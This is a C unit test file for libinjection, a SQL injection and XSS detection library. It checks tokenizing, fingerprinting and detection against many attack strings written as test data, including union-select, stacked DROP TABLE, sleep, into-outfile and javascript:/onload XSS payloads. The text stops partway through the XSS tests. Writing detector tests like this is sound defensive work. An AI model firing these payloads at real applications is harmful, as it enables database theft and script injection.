/**
 * Unit tests for libinjection.
 *
 * Assert-style tests over the public API: version, URL decoding,
 * SQLi tokenization / folding / fingerprinting / detection in all
 * contexts, the false-positive suppressors, and XSS detection in
 * every HTML5 state.  Data-driven tests live in the tests directory
 * and run through testdriver; this file targets API level behaviour and
 * the code paths those files don't reach.
 */

#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#include "libinjection.h"
#include "libinjection_sqli.h"
#include "libinjection_html5.h"
#include "libinjection_xss.h"
#include "libinjection_normalize.h"
#include "libinjection_classify.h"
#include "libinjection_trav.h"
#include "libinjection_ssrf.h"
#include "libinjection_deser.h"
#include "libinjection_crlf.h"
#include "libinjection_cmd.h"
#include "libinjection_ssti.h"
#include "libinjection_nosql.h"
#include "libinjection_ldap.h"
#include "libinjection_code.h"
#include "libinjection_recon.h"
#include "libinjection_redirect.h"

static int g_count = 0;
static int g_fail = 0;
static const char* g_group = "";

static void group(const char* name)
{
    g_group = name;
}

static void ok(int expr, const char* what)
{
    g_count += 1;
    if (! expr) {
        g_fail += 1;
        fprintf(stderr, "FAIL [%s] %s\n", g_group, what);
    }
}

static void ok_str(const char* got, const char* want, const char* what)
{
    g_count += 1;
    if (strcmp(got, want) != 0) {
        g_fail += 1;
        fprintf(stderr, "FAIL [%s] %s: got '%s' want '%s'\n",
                g_group, what, got, want);
    }
}

static void ok_int(long got, long want, const char* what)
{
    g_count += 1;
    if (got != want) {
        g_fail += 1;
        fprintf(stderr, "FAIL [%s] %s: got %ld want %ld\n",
                g_group, what, got, want);
    }
}

/*
 * helpers
 */

static int is_sqli_str(const char* s)
{
    char fp[32];
    return libinjection_sqli(s, strlen(s), fp);
}

static int is_sqli_url_str(const char* s)
{
    char fp[32];
    return libinjection_sqli_url(s, strlen(s), fp);
}

static libinjection_class_mask_t classify_str(const char* s,
    libinjection_class_mask_t want)
{
    return libinjection_classify(s, strlen(s), want);
}

static libinjection_class_mask_t classify_url_str(const char* s,
    libinjection_class_mask_t want)
{
    return libinjection_classify_url(s, strlen(s), want);
}

static int is_sqli_len(const char* s, size_t len)
{
    char fp[32];
    return libinjection_sqli(s, len, fp);
}

/*
 * version
 */
static void test_version(void)
{
    group("version");
    ok(libinjection_version() != NULL, "version() non-null");
    ok_str(libinjection_version(), "4.0.0", "version string");
}

/*
 * libinjection_urldecode
 */
static void test_urldecode(void)
{
    char buf[128];
    size_t len;

    group("urldecode");

    strcpy(buf, "%27");
    len = libinjection_urldecode(buf, 3);
    ok_int((long) len, 1, "%27 length");
    ok(buf[0] == '\'', "%27 decoded to quote");

    strcpy(buf, "a%zz%2");
    len = libinjection_urldecode(buf, 6);
    buf[len] = '\0';
    ok_int((long) len, 6, "all-invalid keeps length");
    ok_str(buf, "a%zz%2", "all-invalid unchanged");

    strcpy(buf, "%2527");
    len = libinjection_urldecode(buf, 5);
    buf[len] = '\0';
    ok_int((long) len, 3, "%2527 shrinks to %27");
    ok_str(buf, "%27", "%2527 -> %27");

    strcpy(buf, "1+AND");
    len = libinjection_urldecode(buf, 5);
    ok_int((long) len, 5, "+ keeps length");
    ok_str(buf, "1 AND", "+ becomes space");

    strcpy(buf, "%u0041");
    len = libinjection_urldecode(buf, 6);
    ok_int((long) len, 1, "%u0041 length");
    ok(buf[0] == 'A', "%u0041 -> A");

    strcpy(buf, "%GG");
    len = libinjection_urldecode(buf, 3);
    ok_int((long) len, 3, "invalid hex untouched");
    ok_str(buf, "%GG", "invalid hex unchanged");

    strcpy(buf, "%2");
    len = libinjection_urldecode(buf, 2);
    ok_int((long) len, 2, "truncated %2 untouched");

    strcpy(buf, "plain");
    len = libinjection_urldecode(buf, 5);
    ok_int((long) len, 5, "plain untouched");
    ok_str(buf, "plain", "plain unchanged");

    len = libinjection_urldecode(buf, 0);
    ok_int((long) len, 0, "empty");

    strcpy(buf, "%C3%A9");
    len = libinjection_urldecode(buf, 6);
    ok_int((long) len, 2, "utf8 pair length");
    ok((unsigned char) buf[0] == 0xC3 && (unsigned char) buf[1] == 0xA9,
       "utf8 pair bytes");
}

/*
 * libinjection_sqli_url: iterative decoding catches multi-encoding
 */
static void test_sqli_url(void)
{
    char fp[32];

    group("sqli_url");

    /* plain attack still detected */
    ok(libinjection_sqli_url("1 union select user,pass--", 25, fp),
       "plain union via sqli_url");

    /* single encoded */
    ok(is_sqli_url_str("1%27%20or%20%271%27%3D%271"),
       "single encoded quote");

    /* double encoded: %2527 -> %27 -> ' */
    ok(is_sqli_url_str("1%2527%2520or%2520%25271%2527%253D%25271"),
       "double encoded quote");

    /* benign input not flagged */
    ok(! is_sqli_url_str("hello%20world%20%26%20friends"),
       "benign encoded text");

    ok(! is_sqli_url_str(""), "empty input");

    /* already decoded, nothing more to do */
    ok(! is_sqli_url_str("nothing to see here"),
       "plain benign");

    /* '+' encoding */
    ok(is_sqli_url_str("1%27+or+%271%27%3D%271"), "plus form");
}

/*
 * tokenization: every parse_* path is reachable from these inputs
 */
static void test_tokenize(void)
{
    sfilter sf;
    stoken_t* tok;

    group("tokenize");

    /* parse_word */
    libinjection_sqli_init(&sf, "abc", 3, 0);
    ok(libinjection_sqli_tokenize(&sf), "word token");
    tok = libinjection_sqli_get_token(&sf, 0);
    ok(tok != NULL && tok->type == 'n', "bareword type");
    ok_str(tok->val, "abc", "bareword value");

    /* keyword lookup through parse_word */
    libinjection_sqli_init(&sf, "UNION", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'U', "UNION type");

    /* parse_word: keyword before dot */
    libinjection_sqli_init(&sf, "SELECT.1", 8, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'E', "select.1 splits at keyword");
    libinjection_sqli_init(&sf, "SELECT.1", 8, 0);
    libinjection_sqli_tokenize(&sf);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', ".1 is a number token");

    /* long words get truncated into the token value */
    libinjection_sqli_init(&sf,
                           "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", 42, 0);
    libinjection_sqli_tokenize(&sf);
    ok_int((long) sf.current->len, 31, "word truncated to 31 chars");

    /* parse_string: closed, unclosed, escaped quote, doubled quote */
    libinjection_sqli_init(&sf, "'abc'", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "string type");
    ok(sf.current->str_open == '\'' && sf.current->str_close == '\'',
       "string quotes");

    libinjection_sqli_init(&sf, "'abc", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_close == '\0', "unclosed string");

    libinjection_sqli_init(&sf, "'a\\'b'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "backslash escaped string");

    libinjection_sqli_init(&sf, "'a''b'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "doubled escaped string");

    libinjection_sqli_init(&sf, "\"abc\"", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_open == '"', "double quote string");

    /* parse_estring: N'str' / E'str', and bare N */
    libinjection_sqli_init(&sf, "N'str'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's' && sf.current->str_open == '\'',
       "N string");

    libinjection_sqli_init(&sf, "E'str'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "E string");

    libinjection_sqli_init(&sf, "NOW", 3, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type != 's', "N without quote falls back to word");

    /* parse_ustring: u'str' and u&'str' */
    libinjection_sqli_init(&sf, "u'str'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "plain u is a bareword");

    libinjection_sqli_init(&sf, "u&'str'", 7, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_open == 'u', "u& string");

    libinjection_sqli_init(&sf, "user", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "u fallback to word");

    /* parse_qstring: oracle q-strings */
    libinjection_sqli_init(&sf, "q'[x]'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_open == 'q' && sf.current->str_close == 'q',
       "q string []");

    libinjection_sqli_init(&sf, "q'{x}'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_close == 'q', "q string {}");

    libinjection_sqli_init(&sf, "qz'x", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "q without quote falls back to word");

    /* parse_nqstring: Nq'...' */
    libinjection_sqli_init(&sf, "nq'[x]'", 7, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_open == 'q', "nq string");

    /* parse_bstring / parse_xstring, plus fallbacks */
    libinjection_sqli_init(&sf, "b'01'", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "binary literal");

    libinjection_sqli_init(&sf, "b'xyz'", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "bad binary literal is word");

    libinjection_sqli_init(&sf, "X'1F'", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "hex literal");

    libinjection_sqli_init(&sf, "x'zz'", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "bad hex literal is word");

    /* parse_bword: mssql brackets */
    libinjection_sqli_init(&sf, "[name]", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "bracket word");

    libinjection_sqli_init(&sf, "[name", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "unclosed bracket word");

    /* parse_var */
    libinjection_sqli_init(&sf, "@@version", 9, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'v' && sf.current->count == 2,
       "@@var");

    libinjection_sqli_init(&sf, "@v", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'v' && sf.current->count == 1,
       "@var");

    libinjection_sqli_init(&sf, "@'v'", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'v', "@'v'");

    libinjection_sqli_init(&sf, "@\"v\"", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'v', "@\"v\"");

    libinjection_sqli_init(&sf, "@", 1, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'v', "lone @");

    /* parse_money */
    libinjection_sqli_init(&sf, "$100", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "$money");

    libinjection_sqli_init(&sf, "$$tag$$", 7, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "$$ dollar string");

    libinjection_sqli_init(&sf, "$tag$x$tag$", 11, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 's', "$tag$ pgsql string");

    libinjection_sqli_init(&sf, "$.", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "$. is a word");

    libinjection_sqli_init(&sf, "$!", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "$! is bare $");

    libinjection_sqli_init(&sf, "$", 1, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "lone $");

    /* parse_number variants */
    libinjection_sqli_init(&sf, "0x1F", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "0x hex");

    libinjection_sqli_init(&sf, "0x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "bare 0x");

    libinjection_sqli_init(&sf, "0b101", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "0b binary");

    libinjection_sqli_init(&sf, "1.5e-3", 6, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "exponent");

    libinjection_sqli_init(&sf, "1.5", 3, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "float");

    libinjection_sqli_init(&sf, ".", 1, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '.', "lone dot");

    libinjection_sqli_init(&sf, "1.2f", 4, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1' && sf.current->len == 4,
       "oracle float suffix");

    libinjection_sqli_init(&sf, "1.2d;", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->len == 4, "oracle double suffix");

    libinjection_sqli_init(&sf, "1e", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "1e is a word");

    libinjection_sqli_init(&sf, "123FROM", 7, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1' && sf.current->len == 3,
       "123FROM -> 123");

    libinjection_sqli_init(&sf, "1.2FUNION", 9, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->len == 4, "1.2FUNION -> 1.2F");

    /* parse_dash variants */
    libinjection_sqli_init(&sf, "-- comment\n1", 11, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'c', "-- white comment");

    libinjection_sqli_init(&sf, "--", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'c', "-- EOF comment");

    libinjection_sqli_init(&sf, "--x", 3, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    libinjection_sqli_tokenize(&sf);
    ok(sf.stats_comment_ddx == 1, "ansi --x is a comment");

    libinjection_sqli_init(&sf, "--x", 3, FLAG_QUOTE_NONE | FLAG_SQL_MYSQL);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', "mysql --x is unary ops");

    libinjection_sqli_init(&sf, "-1", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', "unary minus");

    /* parse_hash */
    libinjection_sqli_init(&sf, "#c", 2, FLAG_QUOTE_NONE | FLAG_SQL_MYSQL);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'c', "mysql # comment");

    libinjection_sqli_init(&sf, "#c", 2, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', "ansi # operator");

    /* parse_slash variants */
    libinjection_sqli_init(&sf, "/* c */", 7, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'c', "c-style comment");

    libinjection_sqli_init(&sf, "/* unclosed", 11, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'c', "unclosed comment runs to EOF");

    libinjection_sqli_init(&sf, "/* /* nested */ */", 18, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'X', "nested comment is EVIL");

    libinjection_sqli_init(&sf, "/*!30000 x*/", 12, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'X', "mysql version comment is EVIL");

    libinjection_sqli_init(&sf, "/x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', "single slash operator");

    /* parse_backslash */
    libinjection_sqli_init(&sf, "\\N", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '1', "\\N is null");

    libinjection_sqli_init(&sf, "\\x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '\\', "backslash token");

    /* parse_operator2 */
    libinjection_sqli_init(&sf, "<=>", 3, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->len == 3, "<=> three char op");

    libinjection_sqli_init(&sf, ":=1", 3, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o' || sf.current->len == 2,
       ":= operator");

    libinjection_sqli_init(&sf, "::x", 3, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', ":: cast operator");

    libinjection_sqli_init(&sf, ":x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == ':', "lone colon");

    libinjection_sqli_init(&sf, ">x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'o', "single char op");

    /* parse_tick */
    libinjection_sqli_init(&sf, "`col`", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n', "tick bareword");

    libinjection_sqli_init(&sf, "`now`", 5, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == 'n' || sf.current->type == 'f',
       "tick function");

    libinjection_sqli_init(&sf, "`unclosed", 9, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->str_close == '\0', "unclosed tick");

    /* parse_char / parse_other / white */
    libinjection_sqli_init(&sf, ";,", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == ';', "semicolon char");

    libinjection_sqli_init(&sf, "?x", 2, 0);
    libinjection_sqli_tokenize(&sf);
    ok(sf.current->type == '?', "question other");

    libinjection_sqli_init(&sf, "  \t\n ", 5, 0);
    ok(! libinjection_sqli_tokenize(&sf), "whitespace only: no tokens");

    /* tokenize empty */
    libinjection_sqli_init(&sf, "", 0, 0);
    ok(! libinjection_sqli_tokenize(&sf), "empty: no tokens");

    /* embedded NUL byte: input does not need c-strings */
    ok(is_sqli_len("1'OR '1'\0'='1", 13), "nul byte in input");
    ok(! is_sqli_len("ab\0cd", 5), "nul byte benign");
}

/*
 * folding rules
 */
static void test_fold(void)
{
    sfilter sf;
    int n;

    group("fold");

    libinjection_sqli_init(&sf, "1 1=1", 5, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 2, "1=1 folds, two numbers stay");

    libinjection_sqli_init(&sf, "'a' 'b'", 7, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, "ss folds");

    libinjection_sqli_init(&sf, ";;", 2, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, ";; folds");

    libinjection_sqli_init(&sf, "1 UNION ALL SELECT 2", 20, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "union all merges");

    libinjection_sqli_init(&sf, "1 (( ", 5, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 2, "(( folds");

    libinjection_sqli_init(&sf, "))", 2, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, ")) folds");

    libinjection_sqli_init(&sf, "1;DROP TABLE x--", 16, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 2, "stacked statement folds");

    /* comments are folded away and remembered */
    libinjection_sqli_init(&sf, "1/*c*/", 6, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "comment folding");

    /* leading comments and parens are skipped entirely */
    libinjection_sqli_init(&sf, "/* only */ (( - 1", 17, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, "only comments/unary/parens");

    libinjection_sqli_init(&sf, "/* only a comment */", 20, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 0, "comment only input folds to zero");

    /* tsql ;IF */
    libinjection_sqli_init(&sf, "1;IF(1)", 7, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "tsql if");

    /* {tag pg string */
    libinjection_sqli_init(&sf, "{foo 1}", 7, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "odbc escape");

    libinjection_sqli_init(&sf, "{``.x}", 6, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "degenerate mysql braces");
    ok(sf.tokenvec[1].type == 'X', "empty tick word after brace is EVIL");

    /* USER() with args downgrades to bareword */
    libinjection_sqli_init(&sf, "USER(1)", 7, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "user(1)");

    /* 6+ token inputs: extra token logic */
    libinjection_sqli_init(&sf, "1,2,3,4,5,6,7", 13, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, "comma list folds to one token");

    /* number, operator, number folding repeatedly */
    libinjection_sqli_init(&sf, "1+2+3+4+5", 9, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, "arithmetic folds to single");

    /* nEuro N token, collate */
    libinjection_sqli_init(&sf, "x COLLATE latin1_german1_ci", 27, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "collate folding");

    /* pgsql cast */
    libinjection_sqli_init(&sf, "'a'::int", 8, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "cast folding");

    /* IN ( */
    libinjection_sqli_init(&sf, "x IN (1,2)", 10, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "IN ( operator");

    /* LIKE ( */
    libinjection_sqli_init(&sf, "x LIKE(1)", 9, 0);
    n = libinjection_sqli_fold(&sf);
    ok(n >= 1, "LIKE ( function");

    /* database.table folding */
    libinjection_sqli_init(&sf, "db.tbl", 6, 0);
    n = libinjection_sqli_fold(&sf);
    ok_int((long) n, 1, "n.n folds");
}

/*
 * fingerprinting and the blacklist/whitelist decision
 */
static void test_fingerprint(void)
{
    sfilter sf;
    const char* fp;

    group("fingerprint");

    libinjection_sqli_init(&sf, "1 UNION SELECT password FROM users--", 36, 0);
    fp = libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok_str(fp, "1UEnk", "classic union fingerprint");

    /* X fingerprint for unparsable input */
    libinjection_sqli_init(&sf, "1 /* /* nested */ */", 20, 0);
    fp = libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok_str(fp, "X", "evil input gives X");

    /* lookup over-rides */
    libinjection_sqli_init(&sf, "1", 1, 0);
    ok(libinjection_sqli_lookup_word(&sf, LOOKUP_WORD, "SELECT", 6) ==
       'E',
       "lookup SELECT");
    ok(libinjection_sqli_lookup_word(&sf, LOOKUP_WORD, "zzz", 3) == '\0',
       "lookup unknown word");
    libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok(! libinjection_sqli_check_fingerprint(&sf), "check benign fp");

    libinjection_sqli_init(&sf, "1 union select x--", 18, 0);
    libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok(libinjection_sqli_blacklist(&sf), "blacklist catches 1UEn");

    /* not_whitelist: benign "1&1" percent glue */
    libinjection_sqli_init(&sf, "80% ACRYLIC AND 20% WOOL", 24, 0);
    libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok(! libinjection_sqli_check_fingerprint(&sf), "80% wool benign");

    /* not_whitelist: attack stays */
    libinjection_sqli_init(&sf, "1 or 1=1", 8, 0);
    libinjection_sqli_fingerprint(&sf, FLAG_QUOTE_NONE | FLAG_SQL_ANSI);
    ok(libinjection_sqli_check_fingerprint(&sf), "1 or 1=1 attack");

    /* reset keeps input and callbacks */
    libinjection_sqli_reset(&sf, 0);
    ok(sf.s != NULL, "reset keeps input");
}

/*
 * full detection, multi-context
 */
static void test_detect(void)
{
    char fp[32];

    group("detect");

    ok(! is_sqli_str(""), "empty");
    ok(! is_sqli_str("hello"), "plain word");
    ok(! is_sqli_str("smiley :-)"), "punct");
    ok(! is_sqli_str("isn't it nice"), "apostrophe text");
    ok(! is_sqli_str("80% ACRYLIC AND 20% WOOL"), "percent text");
    ok(! is_sqli_str("1611-IioXXIG1ti8rspL2vbXFy--"), "base64 tail");
    ok(! is_sqli_str("1,1--"), "list tail");
    ok(! is_sqli_str("x/*"), "lone unterminated comment");
    ok(! is_sqli_str("select x from y where"), "plain query sentence");
    ok(! is_sqli_str("foo`bar"), "ticks");
    ok(! is_sqli_str("{\"json\": \"like data\"}"), "json-ish");

    ok(is_sqli_str("1' OR '1'='1"), "single quote or");
    ok(is_sqli_str("1\" OR \"1\"=\"1"), "double quote or");
    ok(is_sqli_str("1 union select user,pass--"), "union");
    ok(is_sqli_str("';drop table users;--"), "stacked");
    ok(is_sqli_str("1 and sleep(3)"), "sleep");
    ok(is_sqli_str("null' order by 100--"), "order by");
    ok(is_sqli_str("1;DROP TABLE x--"), "stacked drop (new fp)");
    ok(is_sqli_str(";drop table users;"), "leading stacked drop (new fp)");
    ok(is_sqli_str("foo'+'bar"), "string concat escape");
    ok(is_sqli_str("1e0 from (select 1)e union select 2"),
       "scientific notation bypass");
    ok(is_sqli_str("1 and bitand(1,1)=1"), "bitand oracle");
    ok(is_sqli_str("1 limit 1,1 procedure analyse()"), "procedure analyse");
    ok(is_sqli_str("';shutdown--"), "shutdown");
    ok(is_sqli_str("1' and extractvalue(1,concat(0x7e,user()))#"),
       "extractvalue");

    /* mysql reparse: ddx comments */
    ok(is_sqli_str("1' or 'a'--x"), "ddx reparse");

    /* fingerprint returned */
    fp[0] = '\0';
    ok(libinjection_sqli("1 union select x-- ", 19, fp), "fp set");
    ok_str(fp, "1UEnc", "fingerprint value");
}

/*
 * not_whitelist specific branches
 */
static void test_not_whitelist_branches(void)
{
    group("not_whitelist");

    /* 1c: sp_password hidden in comment is always SQLi */
    ok(is_sqli_str("1234--sp_password"), "sp_password");

    /* 1c with white before comment */
    ok(is_sqli_str("1234 -- comment"), "space before comment");
    ok(is_sqli_str("1234--"), "number dash dash");
    ok(is_sqli_str("1234/**/"), "number slash star comment");
    ok(is_sqli_str("1+1--"), "arithmetic then comment");
    ok(! is_sqli_str("1611-IioXXIG1ti8rspL2vbXFy--"), "base64-ish benign");
    ok(! is_sqli_str("1,1--"), "comma list benign");
    ok(! is_sqli_str("1611/IioXXIG1ti8rspL2vbXFy--"), "slash base64 benign");

    /* 's' fingerprint rules */
    ok(is_sqli_str("foo' 'bar"), "adjacent string escape");
    ok(! is_sqli_str("''"), "empty string pair");
    ok(! is_sqli_str("''''"), "escaped quote pair");


    /* INTO OUTFILE */
    ok(is_sqli_str("' into outfile '/tmp/x"), "into outfile");

    /* U with 2 tokens only is ignored */
    ok(! is_sqli_str("1 union"), "bare 1 union is ignored");
}

/*
 * html5 tokenizer state machine
 */
static void test_html5(void)
{
    h5_state_t hs;
    int types[16];
    int n;

    group("html5");

    libinjection_h5_init(&hs, "<a href='x'>text</a>", 20, DATA_STATE);
    n = 0;
    while (libinjection_h5_next(&hs) && n < 16) {
        types[n++] = (int) hs.token_type;
    }
    ok(n >= 6, "tag tokenized");
    ok(types[0] == TAG_NAME_OPEN, "first is tag open");

    libinjection_h5_init(&hs, "</b>", 4, DATA_STATE);
    ok(libinjection_h5_next(&hs) && hs.token_type == TAG_CLOSE,
       "closing tag gives TAG_CLOSE");

    libinjection_h5_init(&hs, "<br/>", 5, DATA_STATE);
    ok(libinjection_h5_next(&hs) && hs.token_type == TAG_NAME_OPEN,
       "br tag open");
    ok(libinjection_h5_next(&hs) && hs.token_type == TAG_NAME_SELFCLOSE,
       "self closing gives TAG_NAME_SELFCLOSE");

    libinjection_h5_init(&hs, "<!-- hi -->", 11, DATA_STATE);
    ok(libinjection_h5_next(&hs) && hs.token_type == TAG_COMMENT,
       "comment");

    libinjection_h5_init(&hs, "<!DOCTYPE html>", 15, DATA_STATE);
    ok(libinjection_h5_next(&hs) && hs.token_type == DOCTYPE,
       "doctype");

    libinjection_h5_init(&hs, "plain text only", 15, DATA_STATE);
    ok(libinjection_h5_next(&hs) && hs.token_type == DATA_TEXT,
       "data text");

    libinjection_h5_init(&hs, "", 0, DATA_STATE);
    ok(! libinjection_h5_next(&hs), "empty html5");

    /* value states */
    libinjection_h5_init(&hs, "x y", 3, VALUE_NO_QUOTE);
    ok(libinjection_h5_next(&hs), "no quote state tokenizes");

    libinjection_h5_init(&hs, "x y", 3, VALUE_SINGLE_QUOTE);
    ok(libinjection_h5_next(&hs), "single quote state tokenizes");

    libinjection_h5_init(&hs, "x y", 3, VALUE_DOUBLE_QUOTE);
    ok(libinjection_h5_next(&hs), "double quote state tokenizes");

    libinjection_h5_init(&hs, "x y", 3, VALUE_BACK_QUOTE);
    ok(libinjection_h5_next(&hs), "back quote state tokenizes");
}

/*
 * XSS detection: every branch
 */
static void test_xss(void)
{
    group("xss");

    /* benign */
    ok(! libinjection_xss("hello world", 11), "plain text");
    ok(! libinjection_xss("<b>bold</b>", 11), "bold tag");
    ok(! libinjection_xss("", 0), "empty");
    ok(! libinjection_xss("it's `quoted` text", 18), "ticks in text");

    /* doctype */
    ok(libinjection_xss("<!DOCTYPE html>", 15), "doctype");

    /* black tags */
    ok(libinjection_xss("<script>x</script>", 18), "script");
    ok(libinjection_xss("<SCRIPT>x</SCRIPT>", 18), "SCRIPT case");
    ok(libinjection_xss("<iframe src=x>", 14), "iframe");
    ok(libinjection_xss("<embed src=x>", 13), "embed");
    ok(libinjection_xss("<svg onload=1>", 14), "svg prefix tag");
    ok(libinjection_xss("<keygen autofocus>", 18), "keygen black tag");
    ok(libinjection_xss("<xsl:stylesheet>x</xsl:stylesheet>", 34),
       "xsl prefix tag");

    /* on* attributes */
    ok(libinjection_xss("<p onclick=alert(1)>", 20), "onclick");
    ok(libinjection_xss("<p ONFOO=1>", 11), "on prefix any");
    ok(libinjection_xss("<input onfocus=alert(1) autofocus>", 34),
       "onfocus");

    /* url attributes */
    ok(libinjection_xss("<a href='javascript:alert(1)'>x</a>", 35), "js href");
    ok(libinjection_xss("<a href='DATA:text/html,x'>x</a>", 32), "data href");
    ok(libinjection_xss("<a href=' vbscript:x'>x</a>", 27), "vbscript");
    ok(libinjection_xss("<a href='view-source:x'>x</a>", 29), "view-source");
    ok(libinjection_xss("<a href='livescript:x'>x</a>", 28), "livescript");
    ok(libinjection_xss("<a href='mocha:x'>x</a>", 23), "mocha");
    ok(libinjection_xss("<a href='mhtml:x'>x</a>", 23), "mhtml");
    ok(libinjection_xss("<a href='jar:x'>x</a>", 21), "jar");
    ok(libinjection_xss("<a href='mscript:x'>x</a>", 25), "mscript");
    ok(libinjection_xss("<a href='&#106;avascript:x'>x</a>", 33),
       "entity encoded js");
